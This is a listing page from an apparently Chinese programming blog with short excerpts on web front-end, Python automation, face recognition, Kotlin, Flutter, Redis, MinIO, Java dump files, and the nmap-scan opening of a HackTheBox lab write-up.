//true将$_COOKIE[$key]给$value， //flase判断$_POST[$key]是否存在，存在将$_POST[$key]赋给$value，不存在将NULL赋值给$value。 $value = isset($_COOKIE[$key]) ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5bf13854cc047d177209903267557fb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d590dc7c3014f984a92d85d7565dedc4/" rel="bookmark">
			input输入框回车发送，移动端回车按钮的样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于移动端经常遇到输入键盘的回车是发送、搜索、下一项等样式
enterkeyhint属性可以修改输入键盘的回车键的表现形式
&lt;input enterkeyhint="enter" placeholder="换行"&gt; &lt;input enterkeyhint="done" placeholder="完成"&gt; &lt;input enterkeyhint="go" placeholder="前往"&gt; &lt;input enterkeyhint="next" placeholder="下一项"&gt; &lt;input enterkeyhint="previous" placeholder="上一项"&gt; &lt;input enterkeyhint="search" placeholder="搜索"&gt; &lt;input enterkeyhint="send" placeholder="发送"&gt; 需要配合事件触发不同的行为(以发送为例)
在vue中采用以下方法监听事件
el-input标签用 @keyup.enter.native &lt;el-input v-model="question" @keydown.enter.native="keyDown"&gt; input用 @keydown.enter
&lt;input enterkeyhint="send" placeholder="发送" onkeydown="Keydown()"&gt; &lt;script&gt; function Keydown(e) { e = e || window.event if (!e.shiftKey &amp;&amp; e.keyCode == 13) { e.cancelBubble = true; //ie阻止冒泡行为 e.stopPropagation(); //Firefox阻止冒泡行为 e.preventDefault(); //取消事件的默认动作*换行 //以下处理发送消息代码 //.... } } &lt;/script&gt; 在输入时希望光标到最后的位置(通过选择内容修改的光标)根据需要放置
&lt;input enterkeyhint="send" onkeydown="Keydown()" value="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d590dc7c3014f984a92d85d7565dedc4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01a0d97fef1ae6977c76d1868f178604/" rel="bookmark">
			python --pywinauto操作微信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		感谢这位作者,解释挺详细
from pywinauto.application import Application from pywinauto.keyboard import send_keys import time import psutil import winreg # 输入进程名，获取PID def get_pid(p_name): pids = psutil.pids() for pid in pids: p = psutil.Process(pid) if p_name in p.name(): return pid def get_wechat_installation_path(): key_path = r"Software\Tencent\WeChat" try: key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ) value, _ = winreg.QueryValueEx(key, "InstallPath") return value[0].upper() + value[1:] + '\WeChat.exe' except FileNotFoundError: print("找不到微信程序") return None chat_name = "文件传输助手" # 需要发送消息的聊天名称 message = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01a0d97fef1ae6977c76d1868f178604/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ce0bc6503ec78e27904d9756bcf2d62/" rel="bookmark">
			IDEA git 创建仓库默认分支名称
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		答: 与 IDEA 无关
可以直接修改git的默认分支名称:
git config --global init.defaultBranch 默认分支名称
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/648cfa16a45b8a180b5fd5078419d01e/" rel="bookmark">
			明星、公众人物人脸识别——Pytorch使用mtcnn&#43;arcface搭建人脸识别平台
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		明星、公众人物人脸识别——Pytorch使用mtcnn+arcface搭建人脸识别平台 一、人脸检测 什么是MTCNN 该算法由3个阶段组成：
第一阶段，通过CNN快速产生候选框体。第二阶段，通过更复杂一点的CNN精炼候选窗体，丢弃大量的重叠窗体。第三阶段，使用更强大的CNN，实现候选窗体去留，同时回归5个面部关键点。 第一阶段是使用一种叫做PNet(Proposal Network)的卷积神经网络，获得候选窗体和边界回归向量。同时，候选窗体根据边界框进行校准。然后利用非极大值抑制去除重叠窗体。
第二阶段是使用R-Net(Refine Network)卷积神经网络进行操作，将经过P-Net确定的包含候选窗体的图片在R-Net中训练，最后使用全连接网络进行分类。利用边界框向量微调候选窗体，最后还是利用非极大值抑制算法去除重叠窗体。
第三阶段，使用Onet(Output Network)卷积神经网络进行操作，该网络比R-Net多一层卷积层，功能与R-Net类似，只是在去除重叠候选窗口的同时标定5个人脸关键点位置。
MTCNN网络在经过3个卷积网络处理之前，先进行了多尺度变换，将一幅人脸图像缩放为不同尺寸的图片，这样就构成了图像金字塔。然后这些不同尺度的图像作为3个阶段的输入数据进行训练，这样可以令MTCNN检测到不同尺寸的人脸。MTCNN三个阶段所做的事情如下图：
NTCNN训练比较复杂，在代码中无需训练，直接使用现有模型即可达到满意效果。
二、人脸识别 什么是ArcFace 论文地址：https://arxiv.org/pdf/1801.07698.pdf
论文代码：https://github.com/deepinsight/insightface
数据集：训练数据集：分别采用CASIA、VGGFACE2、MS1MV2、DeepGlint-Face（包括MS1M-Deepglin和Asian-Deepglin）
人脸验证数据集：LFW、YTF、CFP-FP、AGEDB-30
大姿态和大年龄数据集：CPLFW、CALFW
大规模图像数据集：MegaFace，IJB-B，IJB-C，Trillion-Pairs，iQIYI-VID(视频)
网络结构 我们将特征向量L2归一化，权重L2归一化，他俩的夹角为θ，计算cos(θj)，求反余弦arccos(θyi)得到特征xi与真实权值Wyi之间的夹角θyi，添加角度间隔m，再求余弦cos(θyj+m)，将所有的log乘以特征尺度s，然后将logit送到softmax函数得到各类别概率。再用Ground Truth OneHot Vector一起算出交叉熵损失。
也就是DCNN特征和最后一个完全连接层之间的点积等于特征和权重归一化后的余弦距离。我们利用arc-cosine函数来计算当前特征和目标权重之间的角度。然后，在目标角上加上一个附加的角度间隔，用余弦函数重新计算逻辑回归的反向传播过程。然后，我们用一个固定的特征范数重新缩放。
同样的，提供现有模型，自己无需训练，目前支持resnet50,resnet18和mobilenet_v2模型。resnet50和resnet18参数量比较大，计算量较大，适合在PC服务器部署 ；而mobilenet_v2模型计算量较小，适合嵌入式，开发板，Android等终端部署。
三、项目安装 项目结构说明 ├── common # 配置文件(设置检测模型，特征提取模型)、log ├── core │ ├── alignment # 人脸校准算法 │ ├── detection # 人脸检测模型 │ ├── feature # 人脸特征提取模型 │ ├── face_detector.py # 人脸检测(支持MTCNN) │ ├── face_feature.py # 人脸特征提取模型 │ ├── face_matcher.py # 人脸匹配算法 │ ├── face_recognizer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/648cfa16a45b8a180b5fd5078419d01e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/000e4db69303d7f2d99d8ac7f85fe473/" rel="bookmark">
			Kotlin 中的作用域函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作用域函数在 Kotlin 中非常有用，可以帮助我们管理代码并编写清晰易读的代码。
什么是作用域函数？ Kotlin 标准库中包含几个函数，其唯一目的是在对象的上下文中执行一段代码块。当我们在对象上调用这样的函数并提供一个 lambda 表达式时，它形成了一个临时作用域。在这个作用域中，我们可以通过对象的属性和函数来访问该对象，而无需使用对象的名称。这些函数被称为作用域函数。Kotlin 中共有五个作用域函数：let、run、with、apply 和 also。
关于 this 和 it this：在 run、with 和 apply 函数中，我们可以使用 lambda 接收者关键字 this 来引用上下文对象。因此，在它们的 lambda 表达式中，可以像在普通类函数中一样访问对象。在大多数情况下，当访问接收者对象的成员时，我们可以省略 this，从而使代码更简洁。然而，如果省略了 this，很难区分接收者成员和外部对象或函数之间的区别。因此，在主要通过调用其函数或为属性赋值来操作对象成员的 lambda 中，建议将上下文对象作为接收者 (this)。
val adam = Person("Adam").apply { age = 20 // 与 this.age = 20 相同 city = "London" } println(adam) it：let 和 also 函数将上下文对象作为 lambda 参数引用。如果未指定参数名称，则可以使用隐式的默认名称 it 来访问对象。使用 it 比使用 this 更简洁，使用 it 的表达式通常更易读。然而，当调用对象的函数或属性时，不能像使用 this 那样隐式地访问对象。因此，当对象主要作为函数调用的参数时，通过 it 访问上下文对象更好。如果在代码块中使用多个变量，则使用 it 也更好。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/000e4db69303d7f2d99d8ac7f85fe473/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/006d67bce19df83c0dc0ca321d6f42b8/" rel="bookmark">
			初始C语言
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;stdio.h&gt;
int main()
{
int max(int x, int y);
int a,b,c;
scanf("%d,%d",&amp;a,&amp;b);
c=max(a,b);
printf("max=%d\n",c);
return 0;
}#include &lt;stdio.h&gt;
//
int main()
{
// //printf("hello word\n");
// //return 0;
// //float f = 5.0;
// //printf("%f\n", f);
// //double d = 3.14;
// //printf("%lf\n", d);
// //return 0;
// /*printf("%d\n", sizeof(char));
// printf("%d\n", sizeof(short));
// printf("%d\n", sizeof(int)); // printf("%d\n", sizeof(long)); // printf("%d\n", sizeof(long long));
// printf("%d\n", sizeof(float));
// printf("%d\n", sizeof(double));
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/006d67bce19df83c0dc0ca321d6f42b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df02eab51ed4bb91e611e03fd47059dc/" rel="bookmark">
			双十一互动图片和文字的处理方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一张图片值千言万语，一张经过优化的图片，才能真正地提升我们的网页速度，从而给我们更多的图片插入机会去吸引用户，让网页更加生动。
背景
在本次双十一幻想岛活动中，图片的处理是统一进行处理的，通过这个方法，所有的图片几乎都进行了图片处理，当部分的图片转为webp，或者增加压缩参数之后，大小能够非常显著地缩小，能够提高运行时的性能。
当涉及到在网站上使用图像时，选择适合不同机型的图像格式非常重要。图像格式可以影响网站的加载速度和性能，并且可以显着影响用户体验。
PNG（Portable Network Graphics）是一种无损图像格式，通常用于图像需要透明背景的情况。它支持高质量的图像压缩，但文件大小较大，加载速度较慢。相比之下，JPEG是一种有损图像格式，适用于包含大量颜色细节的照片。它可以在保持图像质量的前提下减小文件大小，但可能会损失一些细节。
WebP是由Google开发的图像格式，结合了有损和无损压缩算法。它可以显著减小图像文件的大小，提高网站的加载速度。与PNG和JPEG相比，WebP格式可以在更小的文件大小下提供相同的图像质量。因此，将图像格式从PNG或JPEG转换为WebP可以帮助我们以更高效的方式适配不同机型。
然而，非常值得注意的是，并不是所有设备都适合webp，所以这一次我们的图片处理主要就是结合了webp转换+CDN压缩和裁切来做的。
图片处理逻辑
在图片处理的时候，首先是CDN的一些基本参数的调整。
▐ 图片缩放裁剪 按长边缩放，不改变图片原有的长宽比，不对图片做裁剪
仅支持图片原尺寸宽度以内以 10 为单位的等比缩小，即 10x10 - 400x400
图片 URL 结尾拼接_200x200.jpg
例如：https://s.alicdn.com/@img/imgextra/i4/O1CN01aPJNdW23khevc9KZv_!!6000000007294-2-tps-404-94.png_200x200.jpg
▐ 图片质量调整 png 图片不支持质量调整
示例：https://s.alicdn.com/@img/imgextra/i4/O1CN01aPJNdW23khevc9KZv_!!6000000007294-2-tps-404-94.png_q30.jpg
当前支持的值：
_q30.jpg
_q50.jpg
_q60.jpg
_q75.jpg
_q80.jpg
_q90.jpg
_q95.jpg
webp 格式转换
只需要在图片 URL 拼接 _.webp 就可以实现 webp 格式转换
示例：https://s.alicdn.com/@sc01/kf/H358e118c7fba46deb45690f0e483bdf5E.jpg_300x300.jpg_.webp
此外还有一些圆角裁切等等规则，在此处并没有被用到。
除开基本参数的调整，我们还针对是否本地已有缓存，对于高低端机的自定义配置放进去图片处理的流程，这样就是一个比较完整的能够用于项目中的处理了。
▐ 关于图片的一些学习经验 有透明就png, 没有就jpg。（极少部分如果透明的PNG太大，可以考虑切一部分图片出来，然后加上使用CSS来实现整个效果
怎么样切一张最适合的图片? 如果是简约矢量图，切成PNG会更加节省空间，如果是色彩多的，jpg则是更优的选择
对于一张尺寸中等的图片，心理价位一般要小于155k。如果大了，可以考虑压缩，或者转换jpg，或者q90等等方案来降下来。
base64是一种内嵌的方法。不需要请求。太小的可以直接base64，或者是可以作为离线的兜底方案
关于使用特殊字体使用的方案
配置在斑马scheme里面，添加我们需要的字体。然后点击上传。
引入数字时的一个很好的解决方案：下载并使用第一个纯 JavaScript字体子集化方案github: fontmin，然后在CDN网站上传字体，点击Zcache显示链接，复制，最后直接在css入口引用
@font-face { font-family: "AlibabaPuHuiTi-2-95-ExtraBold"; src: // IE9 url("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/df02eab51ed4bb91e611e03fd47059dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7a5c79aea932d973e95319e4d832821/" rel="bookmark">
			Flutter GetX框架状态管理源码原理分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GetX状态管理 优点
性能：GetX 打包后得apk占用大小和运行时得内存占用少
效率：语法简洁，并保持了极高得性能，极大缩短开发时间，基本可以通过继承StatelessWidget 完成状态刷新的实现
结构：可以将界面、逻辑、依赖和路由完全解耦，逻辑更清晰。
生态：能够在Android、iOS、web、Linux、windows上用相同的代码运行。 提供了国际化，路由，网络通信及基础小组件的实现等
提高开发效率的插件：
Getx_template:一键生成框架模板
GetX Snippets:代码提示，模板代码
状态管理：简单状态管理器（GetBuilder）、响应式状态管理器(GetX)
GetX响应式状态管理器：
优点：
1.不需要创建StreamControllers
2.不需要为每个变量创建一个SreamBuilder
3.不需要为每个状态创建一个类。
4.当状态发生改变时，只会改变那些真正发生改变的状态，可以更精细化控制,只需要继承statessful即可。
角色：
GetController：负责状态通知和逻辑处理。
在GetxController中，总共有这几种状态，并且，当APP 状态改变时会发生回调，可根据实际情况在这些回调方法中做具体逻辑处理。
可被观察对象：可使用简单写法，直接使用.obs来设置可观察对象，除了基本数据类型也可对自定义类型设置。
例：
Var mInt= 0.obs;
Var mStr= ‘’.obs;
Var mBool=false.obs;
Var mMap=&lt;String,int&gt;{}.obs;
Var TestModel =TestModel().obs;
Widget:UI展示，内部通过Obx 来包裹需要状态管理的Widget,obx相当于观察者，用来监控GetController中被加了.obs的可观察对象。
例：
Obx(() =&gt; Text("Clicks: ${c.count}") GetX使用：
首先将runApp的MaterialApp替换为GetMaterialApp。
void main() { runApp(MyApp()); } class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return GetMaterialApp( title: 'Flutter Demo', theme: ThemeData( primarySwatch: Colors.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7a5c79aea932d973e95319e4d832821/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/faae1b3e99752c0f3616d804c42b7346/" rel="bookmark">
			分布式文件存储系统minio了解下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是minio minio 是一个基于 Apache License v2.0 开源协议的对象存储服务。非常适合于存储大容量非结构化的数据，例如图片、视频、日志文件、备份数据和容器/虚拟机镜像等，而一个对象文件可以是任意大小。 是一种海量、安全、低成本、高可靠的云存储服务，适合存放任意类型的文件。容量和处理能力弹性扩展，多种存储类型供选择，全面优化存储成本。
如果不考虑文件存储上云，minio 是一个非常不错的选择，并且支持分布式部署。
如何使用 minio 进行文件上传 // 引入mioio的依赖包 &lt;!-- minio --&gt; &lt;dependency&gt; &lt;groupId&gt;io.minio&lt;/groupId&gt; &lt;artifactId&gt;minio&lt;/artifactId&gt; &lt;version&gt;7.1.4&lt;/version&gt; &lt;/dependency&gt; // controller层 @PostMapping(value = "/uploadFile", headers = "content-type=multipart/form-data") public Response&lt;List&lt;FileReturn&gt;&gt; uploadFiles(List&lt;MultipartFile&gt; fileList) { return fileService.uploadFileList(fileList); } // service层 --- 伪代码 public List&lt;FileReturn&gt; uploadFileList(List&lt;MultipartFile&gt; fileList) { // 参数校验 if (CollectionUtils.isEmpty(fileList)) { // throw new Exception } List&lt;FileVO&gt; fileVOList = new ArrayList&lt;&gt;(); List&lt;FileReturn&gt; fileReturnList = new ArrayList&lt;&gt;(); // String userId = xxxx; for (MultipartFile file : fileList) { // 校验文件 todo // 开始上传 try { // 将文件存入minio Map&lt;String, String&gt; fileMap = minioClient.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/faae1b3e99752c0f3616d804c42b7346/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9d50254baa0a20246e303d23496a0819/" rel="bookmark">
			15.Redis之三种集群方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		加餐:Redis的三种集群方案 主从复制模式Sentinel(哨兵)模式Cluster Node模式 主从复制模式 1. 基本原理:1主多从 主从复制模式中包含一个主数据库实例(master)与一个或多个从数据库实例(slave)，如下图
客户端可对主数据库进行读写操作，对从数据库进行读操作，主数据库写入的数据会实时自动同步给从数据库。
2.具体工作机制 1.slave启动后，向master发送SYNC命令，master接收到SYNC命令后通过bgsave保存快照即上文所介绍的RDB持久化，并使用缓冲区记录保存快照这段时间内执行的写命令。 ​ 2.master将保存的快照文件发送给slave，并继续记录执行的写命令 ​ 3.slave接收到快照文件后，加载快照文件，载入数据 ​ 4.master快照发送完后开始向slave发送缓冲区的写命令，slave接收命令并执行，完成复制初始化 ​ 5.此后master每次执行一个写命令都会同步发送给slave，保持master与slave之间数据的一致性 3. 主从复制的优缺点 优点：
1.master能自动将数据同步到slave，可以进行读写分离，从节点分担master的读压力
2.master、slave之间的同步是以非阻塞的方式进行的，同步期间，客户端仍然可以提交查询或更新请求
万和615需要冲刺
不具备自动容错与恢复功能，master或slave的宕机都可能导致客户端请求失败，需要等待机器重启或手动切换客户端IP才能恢复master宕机，如果宕机前数据没有同步完，则切换master后会存在数据不一致的问题难以支持在线扩容，Redis的容量受限于单机配置 Sentinel模式:一主多从+哨兵 1. 基本原理 哨兵模式基于主从复制模式，只是引入了哨兵来监控与自动处理故障。如图
哨兵顾名思义，就是来为Redis集群站哨的，一旦发现问题能做出相应的应对处理。其功能包括
监控master、slave是否正常运行当master出现故障时，能自动将一个slave转换为master(大哥挂了，选一个小弟上位)多个哨兵可以监控同一个Redis，哨兵之间也会自动监控 2.具体工作机制 在配置文件中通过 sentinel monitor来定位master的IP、端口，一个哨兵可以监控多个master数据库，只需要提供多个该配置项即可。
哨兵启动后，会与要监控的master建立两条连接：
1.一条用来订阅master的sentinel:hello频道，获取其他监控该master的哨兵节点信息
2.另一条定期向master发送INFO等命令获取master本身的信息
与master建立连接后，哨兵会执行三个操作：
1.定期(10s一次，当master被标记为主观下线时，改为1s1次)向master和slave发送INFO命令
2.定期向sentinel:hello频道发送哨兵自己的信息
3.定期(1s一次)向master、slave和其他哨兵发送PING命令
发送INFO命令可以获取当前数据库的相关信息从而实现新节点的自动发现。
所以说哨兵只需要配置master数据库信息就可以自动发现其slave信息。
获取到其他slave信息后，哨兵也会与slave建立两条连接执行监控:
1.通过INFO命令，哨兵可以获取主从数据库的最新信息，并进行相应的操作，比如角色变更等。
2.哨兵向主从数据库的sentinel:hello频道发送信息与同样监控这些数据库的哨兵共享自己的信息，发送内容为哨兵的ip端口、运行id、配置版本、master名字、master的ip端口还有master的配置版本。
这些信息有以下用处：
其他哨兵可以通过该信息判断发送者是否是新发现的哨兵，如果是的话会创建一个到该哨兵的连接用于发送PING命令。其他哨兵通过该信息可以判断master的版本，如果该版本高于直接记录的版本，将会更新当实现了自动发现slave和其他哨兵节点后，哨兵就可以通过定期发送PING命令定时监控这些数据库和节点有没有停止服务。 如果被PING的数据库或者节点超时(通过sentinel down-after-milliseconds master-name milliseconds 配置)未回复，哨兵认为其主观下线。
如果下线的是master，哨兵会向其它哨兵发送命令询问它们是否也认为该master主观下线，如果达到一定数目(即配置文件中的quorum)投票，哨兵会认为该master已经客观下线，并选举领头的哨兵节点对主从系统发起故障恢复。
若没有足够的sentinel进程同意master下线，master的客观下线状态会被移除，若master重新向sentinel进程发送的PING命令返回有效回复，master的主观下线状态就会被移除
哨兵认为master客观下线后，故障恢复的操作需要由选举的领头哨兵来执行，选举采用Raft算法：
1.发现master下线的哨兵节点(我们称他为A)向每个哨兵发送命令，要求对方选自己为领头哨兵
2.如果目标哨兵节点没有选过其他人，则会同意选举A为领头哨兵
3.如果有超过一半的哨兵同意选举A为领头，则A当选
4.如果有多个哨兵节点同时参选领头，此时有可能存在一轮投票无竞选者胜出，此时每个参选的节点等待一个随机时间后再次发起参选请求，进行下一轮投票竞选，直至选举出领头哨兵
选出领头哨兵后，领头者开始对系统进行故障恢复，从出现故障的master的从数据库中挑选一个来当选新的master,选择规则如下：
所有在线的slave中选择优先级最高的，优先级可以通过slave-priority配置如果有多个最高优先级的slave，则选取复制偏移量最大(即复制越完整)的当选如果以上条件都一样，选取id最小的slave 挑选出需要继任的slave后，领头哨兵向该数据库发送命令使其升格为master，然后再向其他slave发送命令接受新的master，最后更新数据。将已经停止的旧的master更新为新的master的从数据库，使其恢复服务后以slave的身份继续运行。
3. 哨兵模式的优缺点 优点：
1.哨兵模式下，master挂掉可以自动进行切换，系统可用性更高
缺点：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9d50254baa0a20246e303d23496a0819/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/153ab4778dae0080dafcd8bb70be20e3/" rel="bookmark">
			【渗透测试】Surveillance - HackTheBox，网络摄像头渗透&#43;SSH端口转发访问本地资源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		靶场信息 系统：Linux难度：中等 预枚举Pre Enum Nmap
Nmap scan report for bogon (10.10.11.245) Host is up (0.36s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA) |_ 256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://surveillance.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/153ab4778dae0080dafcd8bb70be20e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4cd54081d7df2efaf0a4652a82ec85a2/" rel="bookmark">
			14.Redis之RDB内存快照
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		5.RDB内存快照 上节课，我们学习了 Redis 避免数据丢失的 AOF 方法。这个方法的好处，是每次执行只需要记录操作命令，需要持久化的数据量不大。
一般而言，只要你采用的不是 always 的持久化策略，就不会对性能造成太大影响。
但是，也正因为记录的是操作命令，而不是实际的数据，所以，用 AOF 方法进行故障恢复的时候，需要逐一把操作日志都执行一遍。如果操作日志非常多，Redis 就会恢复得很缓慢，影响到正常使用。这当然不是理想的结果。那么，还有没有既可以保证可靠性，还能在宕机时实现快速恢复的其他方法呢？
当然有了，这就是我们今天要一起学习的另一种持久化方法：内存快照。
所谓内存快照，就是指内存中的数据在某一个时刻的状态记录。这就类似于照片，当你给朋友拍照时，一张照片就能把朋友一瞬间的形象完全记下来。
对 Redis 来说，它实现类似照片记录效果的方式，就是把某一时刻的状态以文件的形式写到磁盘上，也就是快照。这样一来，即使宕机，快照文件也不会丢失，数据的可靠性也就得到了保证。这个快照文件就称为 RDB 文件，其中，RDB 就是 Redis DataBase 的缩写。
和 AOF 相比，RDB 记录的是某一时刻的数据，并不是操作，所以在做数据恢复时，我们可以直接把 RDB 文件读入内存，很快地完成恢复。
听起来好像很不错，但内存快照也并不是最优选项,为什么这么说呢？
我们还要考虑两个关键问题：
对哪些数据做快照？这关系到快照的执行效率问题。
做快照时，数据还能被增删改吗？
这关系到 Redis 是否被阻塞，能否同时正常处理请求。
★RDB全量快照:bgsave:fork(会阻塞主线程) Redis 的数据都在内存中，为了提供所有数据的可靠性保证，它执行的是全量快照，也就是说，把内存中的所有数据都记录到磁盘中，这就类似于给 100 个人拍合影，把每一个人都拍进照片里。这样做的好处是，一次性记录了所有数据，一个都不少。
给内存的全量数据做快照，把它们全部写入磁盘也会花费很多时间。而且，全量数据越多，RDB 文件就越大，往磁盘上写数据的时间开销就越大。
对于Redis而言,它的单线程模型就决定了，我们要尽量避免所有会阻塞主线程的操作。所以针对任何操作我们都会提一个灵魂之问：“它会阻塞主线程吗?”
RDB 文件的生成是否会阻塞主线程，这就关系到是否会降低 Redis 的性能。
Redis 提供了两种命令来生成 RDB 文件，分别是 save 和 bgsave。
save：在主线程中执行，会导致主线程阻塞；已经被废弃。
bgsave：fork创建一个子进程，专门用于写入 RDB 文件，避免了主线程的阻塞，虽然fork操作会阻塞主线程,但是时间很短。
bgsave也是 Redis RDB 文件生成的默认配置。
save 60 1000
上面的命令指的是60秒内，有1000次更改的话就会执行bgsave；
★RDB快照持久化时数据可以修改:写时复制技术 如果快照执行期间数据不能被修改,Redis 就不能处理对这些数据的写操作，那无疑就会给业务服务造成巨大的影响。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4cd54081d7df2efaf0a4652a82ec85a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f90b59343eafcbce7dc4a15ef6f3de8/" rel="bookmark">
			生成和查看dump文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常开发中，即使代码写得有多谨慎，免不了还是会发生各种意外的事件，比如服务器内存突然飙高，又或者发生内存溢出(OOM)。当发生这种情况时，我们怎么去排查，怎么去分析原因呢？
内存溢出
虚拟机由于堆中拥有太多不可回收对象没有回收，导致无法继续创建新对象。
有如下三种异常:
1.Java堆内存异常 报错方式 java.lang.OutOfMemoryError: Java heap space 原因 异常导致-Xms或-Xmx配置不足 使用了大量的递归或无限递归对象 使用了大量循环或死循环（循环中用到了大量的新建的对象） 使用了向数据库查询过多，可能会造成内存溢出。 有数组，List，Map中存放的是对象的引用而不是对象，这些引用会让对应的对象不能被释放。会大量存储在内存中。 2.Java栈内存异常 报错方式 Exception in thread "main" java.lang.StackOverflowError 原因 对象过大或过多异常，导致-Xss配置的内存不足 是否有递归调用 是否有大量循环或死循环 全局变量是否过多 数组、List、map数据是否过大 3.方法区内存异常 报错方式 Exception in thread "main" java.lang.OutOfMemoryError: Metaspace 原因 异常导致-XX:MetaspaceSize或-XX:MaxMetaspaceSize配置不足 解决方案：
当不通过日志文件主观来判断出问题代码时，通过分析dump文件来分析 1. 什么是dump文件? dump文件是一个进程或者系统在某一个给定的时间的快照。
dump文件是用来给驱动程序编写人员调试驱动程序用的，这种文件必须用专用工具软件打开。
dump文件中包含了程序运行的模块信息、线程信息、堆栈调用信息、异常信息等数据。
在服务器运行我们的Java程序时，是无法跟踪代码的，所以当发生线上事故时，dump文件就成了一个很关键的分析点。
2. 如何生成dump文件? 这里介绍两种方式：
一种是主动的 一种是被动的 方式一
主动生成dump文件。首先要查找运行的Java程序的pid。
使用top命令：
然后使用jmap命令生成dump文件。file后面是保存的文件名称，1246则是java程序的PID。
jmap -dump:format=b,file=/Users/zhangjiguo/dump.hprof 1246 命令中的1246是需要dump文件的java进程的pid（括号及括号中的内容要记得删掉），可以通过top命令进行获取
方式二
其实在很多时候我们是不知道何时会发生OOM，所以需要在发生OOM时自动生成dump文件。
其实很简单，只需要在启动时加上如下参数即可。HeapDumpPath表示生成dump文件保存的目录。
-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=D:\tmp
我们还需要模拟出OOM错误，以此触发产生dump文件，首先写个接口：
private static Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); @RequestMapping("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5f90b59343eafcbce7dc4a15ef6f3de8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14eb8905569af0f81fc634b57588ed54/" rel="bookmark">
			python如何在一个py文件中运行另一个py文件的代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python文件运行流程 1. 概述 在Python中，我们可以通过一个py文件运行另一个py文件。这可以通过导入模块、调用函数或使用命令行等方式实现。本文将介绍如何在一个py文件中运行另一个py文件的几种方法，并提供相应的代码示例和详细注释。
2. 方法一：导入模块 2.1 步骤 首先，我们需要将待运行的py文件作为一个模块，在当前py文件中导入它。然后，我们可以通过调用该模块中的函数或访问该模块中的变量来执行相应的代码。
